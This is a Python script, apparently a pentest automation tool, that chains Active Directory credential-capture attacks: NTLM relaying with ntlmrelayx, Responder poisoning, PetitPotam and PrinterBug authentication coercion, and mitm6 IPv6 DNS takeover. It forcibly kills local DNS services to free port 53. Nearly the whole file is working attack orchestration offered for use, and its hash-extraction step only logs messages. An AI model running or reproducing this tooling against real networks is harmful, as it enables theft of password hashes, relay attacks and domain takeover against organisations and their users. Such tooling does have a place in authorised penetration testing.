#!/usr/bin/env python3

import os
import sys
import time
import signal
import logging
import argparse
import netifaces
import ipaddress
import subprocess
import shutil
import socket
from pathlib import Path
from subprocess import Popen, PIPE, STDOUT
from threading import Thread, Event
import json
import re
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('hash_capture.log')
    ]
)

class HashCapture:
    def __init__(self, interface, duration=600, domain=None, creds=None, verbose=True):
        self.interface = interface
        self.duration = duration
        self.domain = domain
        self.creds = creds
        self.verbose = verbose
        self.stop_event = Event()
        self.processes = {}
        self.attack_threads = []
        self.local_ip = self.get_local_ip()
        self.original_ipv6_forward = None
        self.dc_ip = None

        # Initialize logger
        self.logger = logging.getLogger(__name__)
        
        # Set up attack loggers
        self.attack_loggers = {
            "ntlmrelay": logging.getLogger("ntlmrelay"),
            "responder": logging.getLogger("responder"),
            "mitm6": logging.getLogger("mitm6"),
            "petitpotam": logging.getLogger("petitpotam"),
            "printerbug": logging.getLogger("printerbug")
        }

        # Configure attack loggers
        for name, logger in self.attack_loggers.items():
            logger.setLevel(logging.DEBUG if verbose else logging.INFO)
            # Add console handler
            console_handler = logging.StreamHandler(sys.stdout)
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            logger.addHandler(console_handler)
            # Add file handler
            file_handler = logging.FileHandler(f'{name}_attack.log')
            file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            logger.addHandler(file_handler)

        # Configure signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

    def get_local_ip(self):
        """Get the local IP address of the specified interface"""
        try:
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_INET in addrs:
                return addrs[netifaces.AF_INET][0]['addr']
            self.logger.error(f"No IPv4 address found for interface {self.interface}")
            return None
        except Exception as e:
            self.logger.error(f"Error getting local IP: {e}")
            return None

    def signal_handler(self, signum, frame):
        """Handle interruption signals"""
        self.logger.info(f"Received signal {signum}")
        self.cleanup()
        sys.exit(0)

    def setup_ipv6_forwarding(self):
        """Enable IPv6 forwarding"""
        try:
            # Save original IPv6 forwarding state
            with open('/proc/sys/net/ipv6/conf/all/forwarding', 'r') as f:
                self.original_ipv6_forward = f.read().strip()

            # Enable IPv6 forwarding
            subprocess.run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=1"], check=True)
            return True
        except Exception as e:
            self.logger.error(f"Failed to setup IPv6 forwarding: {e}")
            return False

    def process_output(self, process, logger, prefix=""):
        """Process and log output from a subprocess"""
        try:
            for line in iter(process.stdout.readline, ''):
                if self.stop_event.is_set():
                    break
                if line:
                    line = line.strip()
                    if line:
                        logger.debug(f"{prefix}: {line}")
        except Exception as e:
            logger.error(f"Error processing output: {e}")

    def create_targets_file(self):
        """Create targets file for attacks if domain is specified"""
        if not self.domain:
            return True
        
        try:
            # Method 1: Try resolving via ping
            try:
                result = subprocess.run(
                    ["ping", "-c", "1", "-W", "1", self.domain],
                    capture_output=True,
                    text=True,
                    check=True
                )
                
                # Extract IP using regex
                ip_match = re.search(r'PING \S+ \((\d+\.\d+\.\d+\.\d+)\)', result.stdout)
                if ip_match:
                    self.dc_ip = ip_match.group(1)
                    self.logger.info(f"Found DC IP via ping: {self.dc_ip}")
                    
                    with open('targets.txt', 'w') as f:
                        f.write(f"{self.dc_ip}\n")
                    return True
            except subprocess.CalledProcessError as e:
                self.logger.debug(f"Ping resolution failed: {e}")
            except Exception as e:
                self.logger.debug(f"Error in ping resolution: {e}")

            # Method 2: Try socket resolution
            try:
                self.dc_ip = socket.gethostbyname(self.domain)
                self.logger.info(f"Found DC IP via socket: {self.dc_ip}")
                with open('targets.txt', 'w') as f:
                    f.write(f"{self.dc_ip}\n")
                return True
            except socket.gaierror:
                self.logger.debug(f"Socket resolution failed for {self.domain}")

            self.logger.error("Could not resolve domain using any method")
            return False
                
        except Exception as e:
            self.logger.error(f"Error creating targets file: {e}")
            return False

    def start_ntlmrelay(self):
        """Start ntlmrelay attack"""
        try:
            cmd = [
                "ntlmrelayx.py",
                "-tf", "targets.txt",
                "-smb2support",
                "--no-http-server",
                "--no-wcf-server"
            ]
            
            if self.domain:
                cmd.extend(["-domain", self.domain])
            
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
            self.processes["ntlmrelay"] = process
            
            self.process_output(process, self.attack_loggers["ntlmrelay"], "NTLMRELAY")
        except Exception as e:
            self.logger.error(f"Error in start_ntlmrelay: {e}")

    def start_responder(self):
        """Start Responder"""
        try:
            cmd = [
                "responder",
                "-I", self.interface,
                "-wrf"
            ]
            
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
            self.processes["responder"] = process
            
            self.process_output(process, self.attack_loggers["responder"], "RESPONDER")
        except Exception as e:
            self.logger.error(f"Error in start_responder: {e}")

    def start_petitpotam(self):
        """Start PetitPotam attack"""
        if not self.domain or not self.dc_ip:
            return
        
        try:
            cmd = [
                "petitpotam.py",
                "-d", self.domain,
                "-u", self.creds.split(':')[0] if self.creds else "anonymous",
                "-p", self.creds.split(':')[1] if self.creds else "",
                self.local_ip,
                self.dc_ip
            ]
            
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
            self.processes["petitpotam"] = process
            
            self.process_output(process, self.attack_loggers["petitpotam"], "PETITPOTAM")
        except Exception as e:
            self.logger.error(f"Error in start_petitpotam: {e}")

    def start_printerbug(self):
        """Start PrinterBug attack"""
        if not self.domain or not self.dc_ip:
            return
        
        try:
            cmd = [
                "printerbug.py",
                "-d", self.domain,
                "-u", self.creds.split(':')[0] if self.creds else "anonymous",
                "-p", self.creds.split(':')[1] if self.creds else "",
                f"{self.domain}/{self.dc_ip}",
                self.local_ip
            ]
            
            process = Popen(cmd, stdout=PIPE, stderr=STDOUT, universal_newlines=True)
            self.processes["printerbug"] = process
            
            self.process_output(process, self.attack_loggers["printerbug"], "PRINTERBUG")
        except Exception as e:
            self.logger.error(f"Error in start_printerbug: {e}")

    def release_dns_port(self):
        """Attempt to release port 53"""
        try:
            subprocess.run(["sudo", "systemctl", "stop", "systemd-resolved"], check=False)
            subprocess.run(["sudo", "killall", "-9", "named"], check=False)
            subprocess.run(["sudo", "killall", "-9", "bind9"], check=False)
            subprocess.run(["sudo", "killall", "-9", "unbound"], check=False)
            subprocess.run(["sudo", "fuser", "-k", "53/udp"], check=False)
            subprocess.run(["sudo", "fuser", "-k", "53/tcp"], check=False)
            self.logger.info("Successfully attempted to release DNS port 53")
        except Exception as e:
            self.logger.warning(f"Error releasing DNS port: {e}")

    def start_mitm6(self):
        """Start mitm6 attack"""
        try:
            try:
                subprocess.check_call([
                    "pip", "install",
                    "--no-deps", "mitm6==0.2.2",
                    "--break-system-packages"
                ])
            except Exception as e:
                self.logger.warning(f"Could not install/downgrade mitm6: {e}")

            self.release_dns_port()

            cmd = [
                "mitm6",
                "-i", self.interface,
                "--debug",
                "--no-ra"
            ]
            
            if self.domain:
                cmd.extend(["-d", self.domain])
            
            self.logger.info(f"Starting mitm6 with command: {' '.join(cmd)}")
            
            env = os.environ.copy()
            env["PYTHONIOENCODING"] = "latin1"
            env["PYTHONUNBUFFERED"] = "1"
            
            process = Popen(
                cmd,
                stdout=PIPE,
                stderr=STDOUT,
                universal_newlines=True,
                bufsize=1,
                env=env
            )
            self.processes["mitm6"] = process
            
            output_thread = Thread(
                target=self.process_output,
                args=(process, self.attack_loggers["mitm6"], "MITM6")
            )
            output_thread.daemon = True
            output_thread.start()
            
            return True
        except Exception as e:
            self.logger.error(f"Error in start_mitm6: {e}")
            return False

    def extract_hashes(self):
        """Extract captured hashes"""
        try:
            responder_log = Path("/usr/share/responder/logs")
            if responder_log.exists():
                self.logger.info("Processing Responder logs...")
            
            relay_log = Path("./relay.txt")
            if relay_log.exists():
                self.logger.info("Processing NTLM Relay logs...")
                
        except Exception as e:
            self.logger.error(f"Error extracting hashes: {e}")

    def cleanup(self):
        """Cleanup resources and restore system state"""
        try:
            for name, process in self.processes.items():
                try:
                    process.terminate()
                    process.wait(timeout=5)
                except Exception as e:
                    self.logger.warning(f"Error stopping {name}: {e}")
                    try:
                        process.kill()
                    except:
                        pass

            if self.original_ipv6_forward is not None:
                try:
                    with open('/proc/sys/net/ipv6/conf/all/forwarding', 'w') as f:
                        f.write(self.original_ipv6_forward)
                except Exception as e:
                    self.logger.error(f"Error restoring IPv6 forwarding: {e}")

            for file in ['targets.txt']:
                try:
                    if os.path.exists(file):
                        os.remove(file)
                except Exception as e:
                    self.logger.warning(f"Error removing {file}: {e}")

            self.logger.info("Cleanup completed")
        except Exception as e:
            self.logger.error(f"Error in cleanup: {e}")

    def run(self):
        """Main execution flow"""
        self.logger.info("Starting Hash Capture Operation")
        
        if not self.create_targets_file():
            self.logger.error("Failed to create targets file")
            return False

        if not self.setup_ipv6_forwarding():
            self.logger.error("Failed to setup IPv6 forwarding")
            return False

        try:
            attacks = [
                ("NTLM Relay", self.start_ntlmrelay),
                ("PetitPotam", self.start_petitpotam),
                ("PrinterBug", self.start_printerbug)
            ]

            for attack_name, attack_func in attacks:
                try:
                    self.logger.info(f"Launching {attack_name} attack...")
                    thread = Thread(target=attack_func)
                    thread.daemon = True
                    thread.start()
                    self.attack_threads.append(thread)
                    time.sleep(1)
                    self.logger.info(f"{attack_name} attack thread started successfully")
                except Exception as e:
                    self.logger.error(f"Failed to start {attack_name} attack: {e}")
            
            self.logger.info(f"Starting Responder for {self.duration} seconds...")
            responder_thread = Thread(target=self.start_responder)
            responder_thread.daemon = True
            responder_thread.start()
            time.sleep(self.duration)
            self.stop_event.set()
            responder_thread.join(timeout=5)
            self.stop_event.clear()

            self.logger.info("Waiting 60 seconds before starting MITM6...")
            time.sleep(60)

            self.logger.info(f"Starting MITM6 for {self.duration} seconds...")
            mitm6_thread = Thread(target=self.start_mitm6)
            mitm6_thread.daemon = True
            mitm6_thread.start()
            time.sleep(self.duration)
            self.stop_event.set()
            mitm6_thread.join(timeout=5)
            self.stop_event.clear()

            self.logger.info("All attacks completed.")

            # Extract captured hashes and passwords
            self.extract_hashes()

        except KeyboardInterrupt:
            self.logger.info("Operation interrupted by user")
        except Exception as e:
            self.logger.error(f"Error in main execution: {e}")
        finally:
            self.cleanup()
        
        return True

def main():
    parser = argparse.ArgumentParser(description="Hash Capture Tool")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
    parser.add_argument("-t", "--time", type=int, default=600, help="Duration in seconds to run Responder and MITM6 (default: 600)")
    parser.add_argument("-d", "--domain", help="Domain name for attacks")
    parser.add_argument("-c", "--creds", help="Domain credentials in the format 'user:password'")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    if os.geteuid() != 0:
        logging.error("This script must be run as root")
        sys.exit(1)

    capture = HashCapture(args.interface, args.time, args.domain, args.creds, args.verbose)
    if not capture.run():
        sys.exit(1)

if __name__ == "__main__":
    main()
